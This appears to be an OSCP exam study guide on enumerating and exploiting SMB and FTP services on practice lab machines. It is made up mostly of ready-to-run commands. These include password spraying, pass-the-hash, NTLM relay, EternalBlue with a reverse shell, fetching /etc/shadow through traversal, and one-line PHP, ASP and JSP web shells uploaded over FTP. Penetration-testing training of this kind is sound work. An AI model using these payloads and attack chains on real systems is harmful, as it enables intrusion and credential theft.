# OSCP SMB & FTP Enumeration and Exploitation Guide - TJ Null Edition

Based on comprehensive research from GitHub, OffSec, YouTube, CSDN, Medium, and Reddit across Chinese, English, Hindi, Spanish, and French sources, with focus on TJ Null's list scenarios and proven OSCP exam techniques.

## Table of Contents
- [SMB Enumeration Mastery](#smb-enumeration-mastery)
- [FTP Enumeration and Exploitation](#ftp-enumeration-and-exploitation)
- [SMB Exploitation Techniques](#smb-exploitation-techniques)
- [Advanced SMB Attacks](#advanced-smb-attacks)
- [FTP to Shell Techniques](#ftp-to-shell-techniques)
- [TJ Null SMB/FTP Patterns](#tj-null-smb-ftp-patterns)
- [Troubleshooting Common Issues](#troubleshooting-common-issues)

## SMB Enumeration Mastery

### Phase 1: Initial SMB Discovery

**Step 1: SMB Service Detection**
```bash
# Quick SMB discovery (copy-paste ready for any IP)
IP=192.168.1.100  # Edit this line only
nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-enum-sessions,smb-enum-shares $IP

# Comprehensive SMB enumeration
nmap -Pn -p 135,137,138,139,445 -sC -sV $IP
```

**Step 2: Anonymous Access Testing**
```bash
# Test null session access - multiple methods
smbclient -L //$IP -N
smbclient -L //$IP -U ""
smbclient -L //$IP -U ""%""
smbclient -L //$IP -U guest

# Alternative syntax for different environments
smbclient -L \\\\$IP -N
smbclient -L \\\\$IP -U ""
```

**Step 3: Share Enumeration with smbmap**
```bash
# Basic smbmap enumeration
smbmap -H $IP
smbmap -H $IP -u null -p null
smbmap -H $IP -u guest -p guest

# Detailed permissions check
smbmap -H $IP -u null -p null -R
smbmap -H $IP -u guest -p guest -R --depth 3
```

### Phase 2: Deep SMB Enumeration

**Step 1: Comprehensive Tool-Based Enumeration**
```bash
# enum4linux - complete enumeration
enum4linux -a $IP
enum4linux -U $IP  # Users only
enum4linux -S $IP  # Shares only
enum4linux -G $IP  # Groups only

# CrackMapExec enumeration
crackmapexec smb $IP
crackmapexec smb $IP --shares
crackmapexec smb $IP --users
crackmapexec smb $IP --groups
```

**Step 2: RPC Enumeration (Advanced)**
```bash
# RPC null session enumeration
rpcclient -U "" -N $IP
```

**RPC Commands to Execute (copy-paste sequence):**
```
srvinfo
enumdomusers
enumdomgroups
queryuser 500
queryuser 501
queryuser 1000
querygroupmem 512
querygroupmem 513
netshareenumall
netsharegetinfo sharename
lsaquery
lsaenumprivs
```

**Step 3: Share Content Discovery**
```bash
# Connect to discovered shares
smbclient //$IP/sharename -N
smbclient //$IP/sharename -U ""
smbclient //$IP/sharename -U guest

# Mount shares for easier navigation
mkdir /mnt/smb_share
mount -t cifs //$IP/sharename /mnt/smb_share -o username=,password=
```

### Phase 3: SMB Credential Attacks

**Step 1: Password Spraying**
```bash
# Create user list from enumeration
echo -e "administrator\nadmin\nroot\nuser\ntest\nguest\nservice\nsql\noperator\nmanager" > users.txt

# Password spray with common passwords
passwords=("password" "admin" "Password123!" "password123" "123456" "admin123" "")
for pass in "${passwords[@]}"; do
    echo "Testing password: $pass"
    crackmapexec smb $IP -u users.txt -p "$pass" --continue-on-success
done

# Alternative with hydra
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt smb://$IP
```

**Step 2: Hash-Based Attacks**
```bash
# If NTLM hashes are found, test pass-the-hash
crackmapexec smb $IP -u username -H ntlm_hash
crackmapexec smb $IP -u username -H lm_hash:ntlm_hash

# PSExec with hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py username@$IP -hashes lm_hash:ntlm_hash
```

## FTP Enumeration and Exploitation

### Phase 1: FTP Service Discovery

**Step 1: FTP Detection and Banner Grabbing**
```bash
# FTP service detection
IP=192.168.1.100  # Edit this line only
nmap -Pn -p 21 -sC -sV $IP

# Manual banner grabbing
nc -nv $IP 21
telnet $IP 21

# FTP bounce scan detection
nmap --script ftp-bounce $IP -p 21
```

**Step 2: Anonymous Access Testing**
```bash
# Anonymous FTP access attempts
ftp $IP
# Try these credentials:
# anonymous:anonymous
# ftp:ftp
# anonymous:
# ftp:

# Alternative anonymous access
curl ftp://$IP
wget ftp://$IP
```

### Phase 2: FTP Content Enumeration

**Step 1: Anonymous FTP Exploration**
```bash
# Once connected, comprehensive exploration
binary
passive
ls -la
ls -la *
pwd
cd /
ls -la
cd ..
ls -la

# Common directories to check
dirs=("var" "etc" "home" "tmp" "opt" "usr" "www" "web" "backup" "ftp" "pub")
for dir in "${dirs[@]}"; do
    echo "Checking directory: $dir"
    cd /$dir 2>/dev/null && ls -la && pwd
done
```

**Step 2: File Discovery and Download**
```bash
# Download interesting files
get filename
mget *.txt
mget *.conf
mget *.config
mget *.bak
mget *.backup

# Check for hidden files
ls -la .*
get .htaccess
get .htpasswd
get .bash_history
get .bashrc
```

**Step 3: Directory Traversal Testing**
```bash
# Test directory traversal
cd ../../../etc
ls -la
get passwd
get shadow

cd ../../../var/www/html
ls -la
get index.php
get config.php

cd ../../../windows/system32
ls -la
```

### Phase 3: FTP Write Access Testing

**Step 1: Upload Permission Testing**
```bash
# Test write permissions
echo "test content" > test.txt
put test.txt
ls -la test.txt

# Test executable upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
put shell.php
```

**Step 2: Web Directory Upload Testing**
```bash
# Common web directories to test
webdirs=("www" "html" "public_html" "web" "htdocs" "wwwroot")
for dir in "${webdirs[@]}"; do
    echo "Testing upload to: $dir"
    cd /$dir 2>/dev/null || cd /var/$dir 2>/dev/null || cd /var/www/$dir 2>/dev/null
    put shell.php
done
```

## SMB Exploitation Techniques

### Method 1: EternalBlue (MS17-010)

**Step 1: Vulnerability Detection**
```bash
# Check for EternalBlue vulnerability
nmap --script smb-vuln-ms17-010 -p 445 $IP
nmap --script smb-vuln-* -p 445 $IP

# Alternative detection
python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $IP
```

**Step 2: EternalBlue Exploitation**
```bash
# Using Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set payload windows/x64/shell_reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

# Manual exploitation (Python script)
searchsploit ms17-010
cp /usr/share/exploitdb/exploits/windows/remote/42315.py .
python3 42315.py $IP
```

### Method 2: SMBv1 Vulnerabilities

**Step 1: SMBv1 Detection**
```bash
# Check SMB version
nmap --script smb-protocols -p 445 $IP
smbclient -L //$IP -N --option='client min protocol=NT1'

# Vulnerability scanning
nmap --script smb-vuln-* -p 445 $IP
```

**Step 2: SMBv1 Exploitation**
```bash
# Common SMBv1 exploits to test
exploits=(
    "42315.py"  # MS17-010 EternalBlue
    "42031.py"  # MS17-010 EternalRomance
    "7104.c"    # Samba trans2open
)

for exploit in "${exploits[@]}"; do
    echo "Searching for: $exploit"
    searchsploit -m "$exploit" 2>/dev/null
done
```

### Method 3: SMB Relay Attacks

**Step 1: SMB Signing Detection**
```bash
# Check SMB signing requirements
crackmapexec smb $IP --gen-relay-list targets.txt
nmap --script smb-security-mode -p 445 $IP

# Multiple target scanning
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

**Step 2: SMB Relay Setup (If Signing Disabled)**
```bash
# Setup responder
responder -I eth0 -wrf

# Setup ntlmrelayx (in another terminal)
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support

# Alternative with specific commands
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## Advanced SMB Attacks

### Method 1: SMB Share Mounting and Persistence

**Step 1: Permanent Share Mounting**
```bash
# Create mount point
mkdir /mnt/target_share

# Mount with credentials
mount -t cifs //$IP/share /mnt/target_share -o username=user,password=pass

# Mount with null credentials
mount -t cifs //$IP/share /mnt/target_share -o username=,password=

# Persistent mounting (add to /etc/fstab)
echo "//$IP/share /mnt/target_share cifs username=user,password=pass 0 0" >> /etc/fstab
```

**Step 2: File System Exploration**
```bash
# Comprehensive file discovery
find /mnt/target_share -type f -name "*.txt" 2>/dev/null
find /mnt/target_share -type f -name "*.conf" 2>/dev/null
find /mnt/target_share -type f -name "*.config" 2>/dev/null
find /mnt/target_share -type f -name "*password*" 2>/dev/null
find /mnt/target_share -type f -name "*backup*" 2>/dev/null

# Search for interesting content
grep -r "password" /mnt/target_share/ 2>/dev/null
grep -r "username" /mnt/target_share/ 2>/dev/null
grep -r "admin" /mnt/target_share/ 2>/dev/null
```

### Method 2: SMB Command Execution

**Step 1: PSExec-Style Execution**
```bash
# Impacket PSExec
python3 /usr/share/doc/python3-impacket/examples/psexec.py username:password@$IP
python3 /usr/share/doc/python3-impacket/examples/psexec.py domain/username:password@$IP

# Alternative execution methods
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py username:password@$IP
python3 /usr/share/doc/python3-impacket/examples/smbexec.py username:password@$IP
```

**Step 2: CrackMapExec Command Execution**
```bash
# Command execution via CrackMapExec
crackmapexec smb $IP -u username -p password -x "whoami"
crackmapexec smb $IP -u username -p password -x "net user"
crackmapexec smb $IP -u username -p password -x "systeminfo"

# PowerShell execution
crackmapexec smb $IP -u username -p password -X "Get-Process"
```

## FTP to Shell Techniques

### Method 1: FTP to Web Shell

**Step 1: Web Directory Discovery**
```bash
# Common web directories in FTP
webpaths=(
    "/var/www/html"
    "/var/www"
    "/usr/local/www/apache22/data"
    "/htdocs"
    "/www"
    "/inetpub/wwwroot"
    "/xampp/htdocs"
)

# Test each path
for path in "${webpaths[@]}"; do
    echo "Testing path: $path"
    ftp $IP << EOF
anonymous

cd $path
pwd
ls -la
put shell.php
quit
EOF
done
```

**Step 2: Web Shell Creation and Upload**
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php system($_REQUEST["cmd"]); ?>' > shell2.php
echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; } ?>' > shell3.php

# Create ASP web shell
echo '<%execute request("cmd")%>' > shell.asp
echo '<%eval request("cmd")%>' > shell2.asp

# Create JSP web shell
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp

# Upload via FTP
ftp $IP
anonymous

binary
put shell.php
put shell.asp
put shell.jsp
quit
```

**Step 3: Web Shell Access**
```bash
# Test web shell access
curl "http://$IP/shell.php?cmd=whoami"
curl "http://$IP/shell.php?cmd=id"
curl "http://$IP/shell.php?cmd=pwd"
curl "http://$IP/shell.php?cmd=dir" # Windows
curl "http://$IP/shell.php?cmd=ls -la" # Linux
```

### Method 2: FTP Bounce Attacks

**Step 1: FTP Bounce Port Scanning**
```bash
# Use nmap for FTP bounce scanning
nmap -b ftp_user:password@$IP target_ip -p 1-1000

# Manual FTP bounce
ftp $IP
anonymous

PORT 192,168,1,1,0,22  # Target IP: 192.168.1.1, Port: 22
LIST

# Port calculation: port = (high_byte * 256) + low_byte
# For port 22: 0,22 (high=0, low=22)
# For port 80: 0,80
# For port 443: 1,187 (443 = 1*256 + 187)
```

### Method 3: FTP Configuration File Access

**Step 1: FTP Server Configuration Discovery**
```bash
# Common FTP configuration files to look for
config_files=(
    "vsftpd.conf"
    "proftpd.conf" 
    "pure-ftpd.conf"
    "ftpd.conf"
    "wu-ftpd.conf"
    ".ftpaccess"
    "ftpusers"
    "ftpgroups"
)

# Search for configuration files
for file in "${config_files[@]}"; do
    echo "Looking for: $file"
    find /mnt/ftp_share -name "$file" 2>/dev/null
done
```

## TJ Null SMB/FTP Patterns

### Common TJ Null Box SMB Scenarios

**Pattern 1: Anonymous SMB with Credentials**
1. Anonymous SMB access reveals user list
2. Password spray finds valid credentials  
3. Valid credentials provide additional share access
4. Configuration files in shares contain service passwords
5. Service passwords used for shell access

**Pattern 2: SMB with Write Access**
1. Anonymous or authenticated SMB write access
2. Upload malicious files to web-accessible directories
3. Execute uploaded web shells for initial access
4. Use SMB access for privilege escalation files

**Pattern 3: SMB Vulnerability Chain**
1. SMB service version enumeration
2. Public exploit available (EternalBlue, etc.)
3. Direct system-level access via SMB exploit
4. No privilege escalation needed

### Common TJ Null Box FTP Scenarios

**Pattern 1: Anonymous FTP with Web Upload**
1. Anonymous FTP access discovered
2. Web directory writable via FTP
3. PHP/ASP shell uploaded to web directory
4. Web shell accessed via HTTP for command execution

**Pattern 2: FTP Configuration Exposure**
1. Anonymous FTP reveals configuration files
2. Configuration files contain credentials
3. Credentials reused on other services (SSH, SMB, web)
4. Lateral access via credential reuse

**Pattern 3: FTP Directory Traversal**
1. FTP allows directory traversal (cd ../..)
2. System files accessible (passwd, shadow, SAM)
3. Credential extraction from system files
4. Credential cracking and service access

### TJ Null Difficulty Recognition

**Easy SMB/FTP Indicators:**
- Anonymous access immediately available
- Clear file listings with readable names
- Configuration files in obvious locations
- Working public exploits without modification

**Medium SMB/FTP Indicators:**
- Requires credential discovery or brute force
- Files need analysis to find useful information
- Multiple steps needed for exploitation
- Custom application integration required

**Hard SMB/FTP Indicators:**
- Complex credential requirements
- Obscure file locations or naming
- Custom exploitation development needed
- Advanced privilege escalation required

## Troubleshooting Common Issues

### SMB Connection Issues

**Issue 1: SMB1 Protocol Disabled**
```bash
# Force SMBv1 connection
smbclient -L //$IP -N --option='client min protocol=NT1'
smbclient //$IP/share -N --option='client min protocol=NT1'

# Alternative: Enable SMBv1 locally
echo 'client min protocol = NT1' >> /etc/samba/smb.conf
```

**Issue 2: Authentication Failures**
```bash
# Different authentication methods
smbclient -L //$IP -U username%password
smbclient -L //$IP -U domain\\username%password
smbclient -L //$IP -U username --password=password

# Kerberos authentication
kinit username@DOMAIN.COM
smbclient -L //$IP -k
```

**Issue 3: Permission Denied**
```bash
# Check share permissions with different users
smbmap -H $IP -u username -p password -r sharename
crackmapexec smb $IP -u username -p password --shares

# Try different access methods
mount -t cifs //$IP/share /mnt/share -o username=user,password=pass,vers=1.0
```

### FTP Connection Issues

**Issue 1: FTP Connection Refused**
```bash
# Check if FTP is running on different port
nmap -p 1-65535 $IP | grep ftp

# Try different FTP clients
ncftp $IP
curl ftp://$IP
wget --spider ftp://$IP
```

**Issue 2: Passive vs Active Mode**
```bash
# Force passive mode
ftp $IP
passive
ls

# Force active mode  
ftp $IP
active
ls

# Using different clients
ncftp -u anonymous -p anonymous $IP
```

**Issue 3: Binary vs ASCII Mode**
```bash
# Switch to binary mode for file transfers
ftp $IP
binary
get filename

# ASCII mode for text files
ascii
get textfile.txt
```

### Advanced Debugging

**SMB Debugging:**
```bash
# Detailed SMB debugging
smbclient -L //$IP -N -d 3
enum4linux -v $IP

# Check SMB versions supported
nmap --script smb-protocols -p 445 $IP
```

**FTP Debugging:**
```bash
# FTP verbose mode
ftp -v $IP
ftp -d $IP  # Debug mode

# Network tracing
tcpdump -i any -w ftp_traffic.pcap port 21
wireshark # Analyze ftp_traffic.pcap
```

Remember: SMB and FTP enumeration are foundational skills in OSCP. Master the systematic approach: anonymous access → credential discovery → exploitation → privilege escalation. These services often provide the initial foothold needed for the full compromise chain!
